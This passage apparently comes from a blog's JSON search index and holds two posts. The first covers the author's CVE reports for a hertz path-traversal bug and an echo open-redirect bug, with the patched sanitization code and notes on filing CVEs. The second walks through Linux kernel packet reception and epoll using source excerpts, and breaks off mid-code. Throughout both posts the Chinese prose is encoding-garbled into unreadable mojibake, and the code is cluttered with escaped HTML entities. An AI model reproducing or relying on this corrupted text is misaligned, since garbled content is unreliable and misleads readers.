\u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; string(parsedPath) != expectedPath { t.Fatalf(\u0026#34;Unexpected Path: %q. Expected %q\u0026#34;, parsedPath, expectedPath) } } ç•ªå¤– ç¬‘æ­» å½“æˆ‘æƒ³çœ‹çœ‹åˆ«çš„æ¡†æ¶æœ‰æ²¡æœ‰è¿™ä¸ªæ´çš„æ—¶å€™ å‘ç°fasthttpå…­ä¸ªæœˆå‰ä¿®å¤äº†\nhttps://github.com/valyala/fasthttp/issues/1226\nhttps://github.com/valyala/fasthttp/commit/6b5bc7bb304975147b4af68df54ac214ed2554c1\næ·±å¤œæœ‰æ„Ÿå†™äº†ä¸ªå°ä½œæ–‡ç¬‘æ­»ã€‚\nThey just repeat the logic, there is no need to write duplicate code.\nThe point is that backslash also work in windows. So, essentially, we just need to replace the backslash with forward slash, by which we, to some extent, limit the separator.\nIn my limited point of view, my fix is better.\nå¥½å®¶ä¼™åˆçœ‹äº†ä¸€çœ¼echo åˆä¸€ä¸ªcve\nhttps://github.com/labstack/echo/issues/2259\nç¬¬äºŒå¤©æ—©ä¸Šé†’æ¥å‘ç°echoä¸€å°æ—¶å°±æ”¹å¥½å¹¶releaseäº†æ–°ç‰ˆæœ¬ ååº”æ˜¯çœŸçš„å¿«\nhttps://github.com/labstack/echo/pull/2260/files\nçœ‹ä¿®å¤å­¦ä¹ å®‰å…¨ä»£ç å®è·µï¼Œä¸»è¦æ˜¯sanitizeURIå‡½æ•°åˆ æ‰äº†URIå‰ç½®çš„//æˆ–\\\\ç­‰ï¼ŒåŒecho/pull/1775\n1 2 3 4 5 6 7 8 func sanitizeURI(uri string) string { // double slash `\\\\`, `//` or even `\\/` is absolute uri for browsers and by redirecting request to that uri // we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash if len(uri) \u0026gt; 1 \u0026amp;\u0026amp; (uri[0] == \u0026#39;\\\\\u0026#39; || uri[0] == \u0026#39;/\u0026#39;) \u0026amp;\u0026amp; (uri[1] == \u0026#39;\\\\\u0026#39; || uri[1] == \u0026#39;/\u0026#39;) { uri = \u0026#34;/\u0026#34; + strings.TrimLeft(uri, `/\\`) } return uri } å¹¶æ·»åŠ äº†MustSubFSå‡½æ•°æä¾›å®‰å…¨ä¿è¯\nfilepath.ToSlashå‡½æ•°ï¼Œè¿™ä¸ªé€»è¾‘è·Ÿæˆ‘çš„ä¸Šé¢hertzçš„æ¼æ´fixé€»è¾‘æ˜¯ä¸€æ ·çš„ã€‚\n1 2 3 4 5 6 func ToSlash(path string) string { if Separator == \u0026#39;/\u0026#39; { return path } return strings.ReplaceAll(path, string(Separator), \u0026#34;/\u0026#34;) } CVEç¼–å·ç”³è¯· ç›¸ä¿¡èƒ½çœ‹åˆ°æœ¬æ–‡çš„å¤§éƒ¨åˆ†äººéƒ½çœ‹è¿‡ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œå½±å“åŠ›å¯ä»¥è¯´éå¸¸å¤§äº†ï¼Œè‡ªä»è¿™ä¸ªæ–‡ç« å‘å¸ƒåæ–‡ä¸­çš„githubä»“åº“å·²ç»å…¨éƒ½æ˜¯å®‰å…¨issueäº† éƒ½è¢«æ‹¿æ¥åˆ·CVE\nhttps://www.freebuf.com/168362.html\næ–‡ä¸­å¯ä»¥è¯´æ˜¯è®²çš„éå¸¸è¯¦ç»†äº†ï¼Œè¿™é‡Œåªåšä¸€ç‚¹æ€»ç»“ï¼šå¦‚æœä½ çš„æ´æ˜¯CNAçš„é¡¹ç›®ï¼Œé‚£ä¹ˆæ ¹æ®CNAè¦æ±‚åšï¼›ä½ è¿‡ä½ çš„æ´æ˜¯githubå¼€æºé¡¹ç›®ï¼Œé‚£ä¹ˆç›´æ¥åˆ°https://cveform.mitre.org/å¡«å†™è¡¨æ ¼å³å¯ã€‚\nè¡¨æ ¼å¡«å†™éƒ½å¤§å·®ä¸å·® æŒ‰ç…§æ¨¡æ¿æ¥å°±è¡Œï¼Œï¼ˆPS:å¿½ç•¥æˆ‘è¡¨æ ¼ä¸­çš„è‹±è¯­è¯­æ³•é”™è¯¯ğŸ˜€ï¼‰\næœ€ç»ˆç”³è¯·æˆåŠŸCVE-2022-40082 CVE-2022-40083\nç»Ÿè®¡äº†ä¸€ä¸‹å›½å†…CNAåªæœ‰ä¸‹é¢å‡ ä¸ª ä¸»è¦æ˜¯æ“ä½œç³»ç»Ÿå‚å•†å’Œç¡¬ä»¶å‚å•†\nPartner Scope Program Role Organization Type Country* Alibaba, Inc. Projects listed on its Alibaba GitHub website (https://github.com/alibaba) only CNA Vendors and Projects China Dahua Technologies Dahua issues only CNA Vendors and Projects China Hangzhou Hikvision Digital Technology Co., Ltd. All Hikvision Internet of Things (IoT) products (http://www.hikvision.com/en/product_1.html) including cameras and digital video recorders (DVRs) CNA Vendors and Projects China Huawei Technologies Huawei issues only CNA Vendors and Projects China OpenAnolis OpenAnolis issues only CNA Vendors and Projects China openEuler openEuler issues only CNA Vendors and Projects China openGauss Community openGauss issues only CNA Vendors and Projects China OpenHarmony openHarmony issues only CNA Vendors and Projects China OPPO Mobile Telecommunication Corp., Ltd. OPPO devices only CNA Vendors and Projects China Unisoc (Shanghai) Technologies Co., Ltd. Unisoc issues only CNA Vendors and Projects China Vivo Mobile Communication Co., Ltd. Vivo issues only CNA Vendors and Projects China Xiaomi Technology Co., Ltd. Xiaomi issues only CNA Vendors and Projects China ZTE Corporation ZTE products (https://www.zte.com.cn/global/products) only CNA Vendors and Projects China ","description":"","id":6,"section":"posts","tags":["security"],"title":"hertz path-traversal vulnerability; echo open redirect vulnerability","uri":"https://ruokeqx.gitee.io/posts/my_first_cve/"},{"content":"ä¹‹å‰çœ‹libpcap/tcpdumpæºç çš„æ—¶å€™å°±çœ‹è¿‡éƒ¨åˆ†kernel/netéƒ¨åˆ†ä»£ç ã€‚ä¸Šå‘¨æ—¥å¶ç„¶é—´çœ‹åˆ°åˆšå‡ºç‰ˆä¸ä¹…çš„ã€Šæ·±å…¥ç†è§£Linuxç½‘ç»œã€‹è¿™æœ¬ä¹¦ï¼Œè€Œä½œè€…åˆæ°å¥½æ˜¯æˆ‘å½“æ—¶é˜…è¯»libpcapå‚è€ƒæ–‡ç« çš„å…¬ä¼—å·ç»´æŠ¤è€…ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹ç›®å½•æœæ–­å‡†å¤‡ä¸‹å•ï¼ˆè¿™æ¬¡ç¬¬ä¸€æ¬¡å°è¯•å­¦æ ¡å›¾ä¹¦é¦†çš„å€Ÿè´­åŠŸèƒ½ï¼Œåˆ«è¯´è¿˜çœŸæ–¹ä¾¿ï¼Œç›´æ¥å¹³å°ä¸‹å•æ”¶è´§çœ‹äº†è¿˜ç»™å›¾ä¹¦é¦†å°±è¡Œï¼‰ã€‚\nå››äº”å¤©æ—¶é—´çœ‹å®Œäº†ï¼Œä¹ŸæŠŠkernel/netéƒ¨åˆ†ä»£ç å†æ›´æ·±å…¥åœ°çœ‹äº†ä¸€ä¸‹ï¼Œä¹Ÿçœ‹åˆ°ä¹¦ä¸Šçš„ä¸€ç‚¹é—®é¢˜ï¼Œå·²ç»é€šè¿‡å¾®ä¿¡å‘ŠçŸ¥ä½œè€…ã€‚æ€»ä½“ä¸Šæ¥è¯´æ˜¯æœ¬ä¸é”™çš„ä¹¦ç±ï¼Œæˆ‘ä¹Ÿæ”¶è·è‰¯å¤šã€‚æ¯ç« å‰é¢éƒ½ä¼šæå‡ºä¸€äº›é—®é¢˜ï¼Œé€šè¿‡ä¸€ç« çš„æºç åŠåŸç†è§£è¯»ï¼Œç„¶ååœ¨ç« èŠ‚æœ«å°¾ç»™å‡ºç­”æ¡ˆï¼Œå¤§éƒ¨åˆ†é—®é¢˜æ˜¯éšç€çœ‹ä¹¦è·å¾—è§£ç­”çš„ï¼Œä½†æ˜¯æœ‰ä¸€äº›é—®é¢˜æœ‰äº›å®½æ³›æˆ–è€…å¸å¼•çœ¼çƒä¹‹å«Œã€‚å¤§éƒ¨åˆ†ç« èŠ‚æ˜¯å€¼å¾—çœ‹çš„ï¼Œä½†æ˜¯ä¹Ÿæœ‰éƒ¨åˆ†ç« èŠ‚å­˜åœ¨æ°´ç¯‡å¹…ä¹‹å«Œï¼Œå‡å¦‚æƒ³è¦å¿«é€Ÿæµè§ˆï¼Œå»ºè®®çœ‹ä¹¦æœ¬æ’å›¾ä»¥åŠæ¯ç« æ€»ç»“å³å¯ã€‚æ— è®ºæ€ä¹ˆè¯´è¿™æ˜¯ä¸€æœ¬ä¼˜è´¨çš„ä¹¦(å¦åˆ™ä¹Ÿä¸å¯èƒ½çŸ­çŸ­å‡ æœˆå”®å‡ºä¸Šä¸‡å†Œ)ï¼Œæ’å›¾è´¨é‡ä¹Ÿç”šæ˜¯ä¸é”™ã€‚\né‚£æˆ‘ä¹Ÿä»¥ä¹¦ç±ç« èŠ‚çš„é€»è¾‘è¿›è¡Œæœ¬æ–‡å¸ƒå±€å§ã€‚\nå†…æ ¸æ”¶åŒ… 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # ç¡¬ä¸­æ–­ igb_msix_ring # è½¯ä¸­æ–­ napi_poll # ç½‘å¡pollæ•°æ® igb_poll # æ‘˜ä¸‹skb igb_clean_rx_irq # ä¼ è¾“skb deliver_skb # ipå¤„ç† ip_rcv # tcpå¤„ç† tcp_v4_rcv æ³¨å†Œper-CPU queues softnet_data\næ³¨å†Œè½¯ä¸­æ–­å¤„ç†å‡½æ•°åˆ°softirq_vec åç»­æ ¹æ®è½¯ä¸­æ–­ç±»å‹è¿›è¡Œä¸åŒå¤„ç†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // include/linux/interrupt.h enum { HI_SOFTIRQ=0, TIMER_SOFTIRQ, NET_TX_SOFTIRQ, NET_RX_SOFTIRQ, BLOCK_SOFTIRQ, IRQ_POLL_SOFTIRQ, TASKLET_SOFTIRQ, SCHED_SOFTIRQ, HRTIMER_SOFTIRQ, RCU_SOFTIRQ, /* Preferable RCU should always be the last softirq */ NR_SOFTIRQS }; struct softirq_action { void\t(*action)(struct softirq_action *); }; // net/core/dev.c static int __init net_dev_init(void) { /* * Incoming packets are placed on per-CPU queues */ // struct softnet_data {} /* *\tInitialise the packet receive queues. */ for_each_possible_cpu(i) { struct work_struct *flush = per_cpu_ptr(\u0026amp;flush_works, i); struct softnet_data *sd = \u0026amp;per_cpu(softnet_data, i); INIT_WORK(flush, flush_backlog); skb_queue_head_init(\u0026amp;sd-\u0026gt;input_pkt_queue); skb_queue_head_init(\u0026amp;sd-\u0026gt;process_queue); #ifdef CONFIG_XFRM_OFFLOAD skb_queue_head_init(\u0026amp;sd-\u0026gt;xfrm_backlog); #endif INIT_LIST_HEAD(\u0026amp;sd-\u0026gt;poll_list); sd-\u0026gt;output_queue_tailp = \u0026amp;sd-\u0026gt;output_queue; #ifdef CONFIG_RPS INIT_CSD(\u0026amp;sd-\u0026gt;csd, rps_trigger_softirq, sd); sd-\u0026gt;cpu = i; #endif init_gro_hash(\u0026amp;sd-\u0026gt;backlog); sd-\u0026gt;backlog.poll = process_backlog; sd-\u0026gt;backlog.weight = weight_p; } ... open_softirq(NET_TX_SOFTIRQ, net_tx_action); open_softirq(NET_RX_SOFTIRQ, net_rx_action); ... } // kernel/softirq.c static struct softirq_action softirq_vec[NR_SOFTIRQS] __cacheline_aligned_in_smp; void open_softirq(int nr, void (*action)(struct softirq_action *)) { softirq_vec[nr].action = action; } æ³¨å†Œåè®®\ninet_add_protocolå°†åè®®æ³¨å†Œåˆ°inet_protosæ•°ç»„\ndev_add_packå°†ip_packet_typeæ·»åŠ åˆ°ptype_baseå“ˆå¸Œè¡¨\nå…¶ä¸­æ·»åŠ é€»è¾‘æ˜¯packet_type==ETH_P_ALLä¹…æ·»åŠ åˆ°ptype_all è¿™ä¹Ÿæ˜¯libpcapæŠ“åŒ…åŸç†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 // net/ipv4/af_inet.c static struct net_protocol tcp_protocol = { .early_demux\t=\ttcp_v4_early_demux, .early_demux_handler = tcp_v4_early_demux, .handler\t=\ttcp_v4_rcv, .err_handler\t=\ttcp_v4_err, .no_policy\t=\t1, .icmp_strict_tag_validation = 1, }; static struct net_protocol udp_protocol = { .early_demux =\tudp_v4_early_demux, .early_demux_handler =\tudp_v4_early_demux, .handler =\tudp_rcv, .err_handler =\tudp_err, .no_policy =\t1, }; static const struct net_protocol icmp_protocol = { .handler =\ticmp_rcv, .err_handler =\ticmp_err, .no_policy =\t1, }; static struct packet_type ip_packet_type __read_mostly = { .type = cpu_to_be16(ETH_P_IP), .func = ip_rcv, .list_func = ip_list_rcv, }; static int __init inet_init(void){ /* *\tAdd all the base protocols. */ if (inet_add_protocol(\u0026amp;icmp_protocol, IPPROTO_ICMP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add ICMP protocol\\n\u0026#34;, __func__); if (inet_add_protocol(\u0026amp;udp_protocol, IPPROTO_UDP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add UDP protocol\\n\u0026#34;, __func__); if (inet_add_protocol(\u0026amp;tcp_protocol, IPPROTO_TCP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add TCP protocol\\n\u0026#34;, __func__); ... /* Register the socket-side information for inet_create. */ for (r = \u0026amp;inetsw[0]; r \u0026lt; \u0026amp;inetsw[SOCK_MAX]; ++r) INIT_LIST_HEAD(r); // æŠŠinetsw_arrayä¸­æ‰€æœ‰å…ƒç´ æ’å…¥é“¾è¡¨inetsw for (q = inetsw_array; q \u0026lt; \u0026amp;inetsw_array[INETSW_ARRAY_LEN]; ++q) inet_register_protosw(q); ... dev_add_pack(\u0026amp;ip_packet_type); } // net/ipv4/protocol.c struct net_protocol __rcu *inet_protos[MAX_INET_PROTOS] __read_mostly; int inet_add_protocol(const struct net_protocol *prot, unsigned char protocol) { return !cmpxchg((const struct net_protocol **)\u0026amp;inet_protos[protocol], NULL, prot) ? 0 : -1; } // net/core/dev.c struct list_head ptype_base[PTYPE_HASH_SIZE] __read_mostly; struct list_head ptype_all __read_mostly;\t/* Taps */ static inline struct list_head *ptype_head(const struct packet_type *pt) { if (pt-\u0026gt;type == htons(ETH_P_ALL)) return pt-\u0026gt;dev ? \u0026amp;pt-\u0026gt;dev-\u0026gt;ptype_all : \u0026amp;ptype_all; else return pt-\u0026gt;dev ? \u0026amp;pt-\u0026gt;dev-\u0026gt;ptype_specific : \u0026amp;ptype_base[ntohs(pt-\u0026gt;type) \u0026amp; PTYPE_HASH_MASK]; } void dev_add_pack(struct packet_type *pt) { struct list_head *head = ptype_head(pt); spin_lock(\u0026amp;ptype_lock); list_add_rcu(\u0026amp;pt-\u0026gt;list, head); spin_unlock(\u0026amp;ptype_lock); } EXPORT_SYMBOL(dev_add_pack); æ³¨å†Œç½‘å¡é©±åŠ¨igb_probeä½¿ç½‘å¡ready\næ³¨å†Œigb_netdev_opsåˆ°netdev_opsï¼Œnapiæ·»åŠ igb_poll\nigb_netdev_opsä¸­åŒ…å«igb_open å…¶åˆå§‹åŒ–èµ„æºå¦‚åˆ›å»ºringbufferï¼Œæ³¨å†Œä¸­æ–­å¤„ç†å‡½æ•°igb_msix_ring ä¸ºæ¯ä¸ªé˜Ÿåˆ—è®¾ç½®å•ç‹¬MSI-Xä¸­æ–­ï¼Œå¯ç”¨napiç­‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // drivers/net/ethernet/intel/igb/igb_main.c static struct pci_driver igb_driver = { .name = igb_driver_name, .id_table = igb_pci_tbl, .probe = igb_probe, .remove = igb_remove, #ifdef CONFIG_PM .driver.pm = \u0026amp;igb_pm_ops, #endif .shutdown = igb_shutdown, .sriov_configure = igb_pci_sriov_configure, .err_handler = \u0026amp;igb_err_handler }; static int __init igb_init_module(void) { ret = pci_register_driver(\u0026amp;igb_driver); } static int igb_probe(struct pci_dev *pdev, const struct pci_device_id *ent) { netdev-\u0026gt;netdev_ops = \u0026amp;igb_netdev_ops; } static int igb_alloc_q_vector(struct igb_adapter *adapter, int v_count, int v_idx, int txr_count, int txr_idx, int rxr_count, int rxr_idx) { /* initialize NAPI */ netif_napi_add(adapter-\u0026gt;netdev, \u0026amp;q_vector-\u0026gt;napi, igb_poll, 64); } // ä¸ºæ¯ä¸ªRXé˜Ÿåˆ—è®¾ç½®å•ç‹¬MSI-Xä¸­æ–­ è®¾ç½®ä¸­æ–­å¤„ç†å‡½æ•°igb_msix_ring static int igb_request_msix(struct igb_adapter *adapter){ for (i = 0; i \u0026lt; adapter-\u0026gt;num_q_vectors; i++) { err = request_irq(adapter-\u0026gt;msix_entries[vector].vector, igb_msix_ring, 0, q_vector-\u0026gt;name, } } å½“æ•°æ®åˆ°æ—¶\nigb_msix_ring\n__raise_softirq_irqoff(NET_RX_SOFTIRQ)\n__do_softirq\nnet_rx_action\nnapi_poll\nigb_poll\nigb_clean_rx_irq\nnapi_gro_receive-\u0026gt;napi_skb_finish-\u0026gt;gro_normal_one-\u0026gt;gro_normal_list-\u0026gt;netif_receive_skb_list_internal-\u0026gt;__netif_receive_skb_list-\u0026gt;__netif_receive_skb_list_core-\u0026gt;__netif_receive_skb_core\ndeliver_skb\nip_rcv\nip_rcv_finish-\u0026gt;dst_input-\u0026gt;ip_local_deliver-\u0026gt;ip_local_deliver_finish-\u0026gt;ip_protocol_deliver_rcu-\u0026gt;INDIRECT_CALL_2(ipprot-\u0026gt;handler, tcp_v4_rcv, udp_rcv, skb);\ntcp_v4_rcv\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 // drivers/net/ethernet/intel/igb/igb_main.c // ç¡¬ä¸­æ–­å¤„ç†å‡½æ•° static irqreturn_t igb_msix_ring(int irq, void *data) { struct igb_q_vector *q_vector = data; /* Write the ITR value calculated from the previous interrupt. */ igb_write_itr(q_vector); napi_schedule(\u0026amp;q_vector-\u0026gt;napi); return IRQ_HANDLED; } // include/linux/netdevice.h // napi-\u0026gt;poll_liståŠ åˆ°sd-\u0026gt;poll_list å‰é¢è¯´è¿‡sdæ˜¯ä¸€ä¸ªpercpu queueä¹Ÿå³æ˜¯è¯´ç¡¬ä¸­æ–­åœ¨å“ªä¸ªcpuè½¯ä¸­æ–­ä¹Ÿç”±å“ªä¸ªcpuå¤„ç† // ç„¶åè½¯ä¸­æ–­è°ƒç”¨NET_RX_SOFTIRQå¤„ç†å‡½æ•° static inline void ____napi_schedule(struct softnet_data *sd, struct napi_struct *napi) { list_add_tail(\u0026amp;napi-\u0026gt;poll_list, \u0026amp;sd-\u0026gt;poll_list); __raise_softirq_irqoff(NET_RX_SOFTIRQ); } // kernel/softirq.c void __raise_softirq_irqoff(unsigned int nr) { lockdep_assert_irqs_disabled(); trace_softirq_raise(nr); or_softirq_pending(1UL \u0026lt;\u0026lt; nr); } static void run_ksoftirqd(unsigned int cpu) { ksoftirqd_run_begin(); if (local_softirq_pending()) { /* * We can safely run softirq on inline stack, as we are not deep * in the task stack here. */ __do_softirq(); ksoftirqd_run_end(); cond_resched(); return; } ksoftirqd_run_end(); } asmlinkage __visible void __softirq_entry __do_softirq(void) { h = softirq_vec; while ((softirq_bit = ffs(pending))) { unsigned int vec_nr; // åé¢è®°å½•vec_nrä½œä¸ºæ—¥å¿— ä»£ç å¿½ç•¥ h += softirq_bit - 1; // å‰é¢net_dev_init-\u0026gt;open_softirqæ³¨å†Œè½¯ä¸­æ–­çš„æ—¶å€™æ³¨å†Œäº†actionå‡½æ•° h-\u0026gt;action(h); h++; pending \u0026gt;\u0026gt;= softirq_bit; } } // drivers/net/ethernet/intel/igb/igb_main.c // igb_poll - NAPI Rx polling callback static int igb_poll(struct napi_struct *napi, int budget) { if (q_vector-\u0026gt;tx.ring) clean_complete = igb_clean_tx_irq(q_vector, budget); if (q_vector-\u0026gt;rx.ring) { int cleaned = igb_clean_rx_irq(q_vector, budget); } static int igb_clean_rx_irq(struct igb_q_vector *q_vector, const int budget) { struct igb_adapter *adapter = q_vector-\u0026gt;adapter; struct igb_ring *rx_ring = q_vector-\u0026gt;rx.ring; struct sk_buff *skb = rx_ring-\u0026gt;skb; ... while (likely(total_packets \u0026lt; budget)) { rx_buffer = igb_get_rx_buffer(rx_ring, size, \u0026amp;rx_buf_pgcnt); napi_gro_receive(\u0026amp;q_vector-\u0026gt;napi, skb); } } // net/core/dev.c static int __netif_receive_skb_core(struct sk_buff **pskb, bool pfmemalloc, struct packet_type **ppt_prev) { // libpcapæŠ“åŒ…ç‚¹(æ³¨æ„è¿™æ—¶å€™è¿˜æ²¡åˆ°åè®®æ ˆ) list_for_each_entry_rcu(ptype, \u0026amp;ptype_all, list) { if (pt_prev) ret = deliver_skb(skb, pt_prev, orig_dev); pt_prev = ptype; } list_for_each_entry_rcu(ptype, \u0026amp;skb-\u0026gt;dev-\u0026gt;ptype_all, list) { if (pt_prev) ret = deliver_skb(skb, pt_prev, orig_dev); pt_prev = ptype; } } static inline int deliver_skb(struct sk_buff *skb, struct packet_type *pt_prev, struct net_device *orig_dev) { if (unlikely(skb_orphan_frags_rx(skb, GFP_ATOMIC))) return -ENOMEM; refcount_inc(\u0026amp;skb-\u0026gt;users); // packet_typeæ˜¯ä¹‹å‰dev_add_packæ³¨å†Œip_packet_type funcæ˜¯ip_rcv return pt_prev-\u0026gt;func(skb, skb-\u0026gt;dev, pt_prev, orig_dev); } // net/ipv4/ip_input.c // ip_rcvæ³¨å†ŒPREROUTING // ip_local_deliveræ³¨å†ŒLOCALIN int ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) { struct net *net = dev_net(dev); skb = ip_rcv_core(skb, net); if (skb == NULL) return NET_RX_DROP; return NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING, net, NULL, skb, dev, NULL, ip_rcv_finish); } ip_rcv_finish-\u0026gt;dst_input-\u0026gt;ip_local_deliver int ip_local_deliver(struct sk_buff *skb) { /* *\tReassemble IP fragments. */ struct net *net = dev_net(skb-\u0026gt;dev); if (ip_is_fragment(ip_hdr(skb))) { if (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER)) return 0; } return NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN, net, NULL, skb, skb-\u0026gt;dev, NULL, ip_local_deliver_finish); } ip_local_deliver_finish-\u0026gt;ip_protocol_deliver_rcu INDIRECT_CALLABLE_DECLARE(int udp_rcv(struct sk_buff *)); INDIRECT_CALLABLE_DECLARE(int tcp_v4_rcv(struct sk_buff *)); void ip_protocol_deliver_rcu(struct net *net, struct sk_buff *skb, int protocol) { const struct net_protocol *ipprot; int raw, ret; resubmit: raw = raw_local_deliver(skb, protocol); ipprot = rcu_dereference(inet_protos[protocol]); if (ipprot) { if (!ipprot-\u0026gt;no_policy) { if (!xfrm4_policy_check(NULL, XFRM_POLICY_IN, skb)) { kfree_skb_reason(skb, SKB_DROP_REASON_XFRM_POLICY); return; } nf_reset_ct(skb); } ret = INDIRECT_CALL_2(ipprot-\u0026gt;handler, tcp_v4_rcv, udp_rcv, skb); if (ret \u0026lt; 0) { protocol = -ret; goto resubmit; } __IP_INC_STATS(net, IPSTATS_MIB_INDELIVERS); } else { if (!raw) { if (xfrm4_policy_check(NULL, XFRM_POLICY_IN, skb)) { __IP_INC_STATS(net, IPSTATS_MIB_INUNKNOWNPROTOS); icmp_send(skb, ICMP_DEST_UNREACH, ICMP_PROT_UNREACH, 0); } kfree_skb_reason(skb, SKB_DROP_REASON_IP_NOPROTO); } else { __IP_INC_STATS(net, IPSTATS_MIB_INDELIVERS); consume_skb(skb); } } } BIO/NIO BIO recvfromæœ‰æ•°æ®ä»sk_receive_queueæ¥å—æ•°æ® æ²¡æ•°æ®å°±æ”¾å…¥sk_wq\nrecvfrom-\u0026gt;inet_recvmsg-\u0026gt;tcp_recvmsg-\u0026gt;sk_wait_data-\u0026gt;sk_sleep(sk)é˜»å¡\n1 2 3 4 5 6 7 8 9 10 11 struct sock { struct sock_common\t__sk_common; #define sk_prot\t__sk_common.skc_prot struct sk_buff_head\tsk_receive_queue; union { struct socket_wq __rcu\t*sk_wq; /* private: */ struct socket_wq\t*sk_wq_raw; /* public: */ }; } tcp_v4_rcvæ—¶tcp_rcv_establishedä¸€è¾¹ä¿å­˜æ•°æ®åˆ°sk_receive_queueä¸€è¾¹sk_data_readyå”¤é†’sk_wqçš„ç­‰å¾…è¿›ç¨‹\n1 2 3 -\u0026gt;tcp_queue_rcv tcp_v4_rcv-\u0026gt;tcp_v4_do_rcv-\u0026gt;tcp_rcv_established -\u0026gt;sk_data_ready-\u0026gt;sock_def_readable NIO æœ¬è´¨ä¸Šepollå’Œé˜»å¡ioä¸åŒåœ¨äºä¸€ä¸ªwake epoll wqä¸­è¿›ç¨‹ä¸€ä¸ªwake socket wqä¸­è¿›ç¨‹\nepollå†…éƒ¨ç»´æŒrb_treeç»´æŒä¼—å¤šsocket ï¼Œrdllist å’Œ wqæ˜¯å°±ç»ªé˜Ÿåˆ—å’Œç­‰å¾…é˜Ÿåˆ—ï¼Œæ¯ä¸ªé¡¹æœ‰funcè¿›è¡Œwake privateæŒ‡å‘çš„è¿›ç¨‹ï¼Œrb_entryä¸­çš„socketæ”¶åˆ°æ•°æ®funcæ˜¯ep_call_backä¸éœ€è¦å”¤é†’socketå¯¹åº”è¿›ç¨‹æ‰€ä»¥privateæŒ‡å‘nullï¼Œepoll wqéœ€è¦å”¤é†’epollçš„è¿›ç¨‹æ‰€ä»¥å…¶æ˜¯default_wake_func å”¤é†’privateæŒ‡å‘currentæœ¬èº«è¿›ç¨‹ã€‚å…¶æœ¬è´¨æ˜¯å°†å¤šä¸ªsocketè¿›è¡Œå°è£…äº¤ç”±ä¸€ä¸ªè¿›ç¨‹ç®¡ç†ä»è€Œå‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢é€ æˆçš„æ€§èƒ½æŸè€—ã€‚\n1 2 3 4 5 6 7 8 9 10 struct eventpoll { /* Wait queue used by sys_epoll_wait() */ wait_queue_head_t wq; /* Wait queue used by file-\u0026gt;poll() */ wait_queue_head_t poll_wait; struct list_head rdllist; struct rb_root_cached rbr; struct epitem *ovflist; struct file *file; }; epoll_ctl Addæ·»åŠ socketå¹¶å°†å…¶funcè®¾ç½®æˆep_poll_callbackï¼Œå› ä¸ºåœ¨default_wake_functionä¸­æ˜¯æ ¹æ®entryçš„privateå”¤é†’å¯¹åº”è¿›ç¨‹è€Œep_poll_callbackåªæ˜¯é€šçŸ¥epollæ‰€ä»¥ä¸éœ€è¦è®¾ç½®è¿™ä¸ªentryçš„private\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 // fs/eventpoll.c static int ep_insert(struct eventpoll *ep, const struct epoll_event *event, struct file *tfile, int fd, int full_check) { // æ³¨å†Œå›è°ƒ init_poll_funcptr(\u0026amp;epq.pt, ep_ptable_queue_proc); // è§¦å‘å›è°ƒ revents = ep_item_poll(epi, \u0026amp;epq.pt, 1); } static __poll_t ep_item_poll(const struct epitem *epi, poll_table *pt, int depth) { struct file *file = epi-\u0026gt;ffd.file; __poll_t res; pt-\u0026gt;_key = epi-\u0026gt;event.events; if (!is_file_epoll(file)) res = vfs_poll(file, pt); else res = __ep_eventpoll_poll(file, pt, depth); return res \u0026amp; epi-\u0026gt;event.events; } static inline __poll_t vfs_poll(struct file *file, struct poll_table_struct *pt) { return file-\u0026gt;f_op-\u0026gt;poll(file, pt); } static void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead, poll_table *pt) { init_waitqueue_func_entry(\u0026amp;pwq-\u0026gt;wait, ep_poll_callback); if (epi-\u0026gt;event.events \u0026amp; EPOLLEXCLUSIVE) add_wait_queue_exclusive(whead, \u0026amp;pwq-\u0026gt;wait); else // ep_poll_callbackæ”¾å…¥socketç­‰å¾…é˜Ÿåˆ—whead // socketæœ‰æ•°æ®åˆ°çš„æ—¶å€™ä¼šè§¦å‘wqä¸­çš„callback // ä¹Ÿå°±æ˜¯è¯´ç°åœ¨socketæœ‰æ•°æ®æ—¶å°±ä¸æ˜¯å”¤é†’åˆ›å»ºsocketçš„è¿›ç¨‹è€Œæ˜¯è°ƒç”¨ep_poll_callback add_wait_queue(whead, 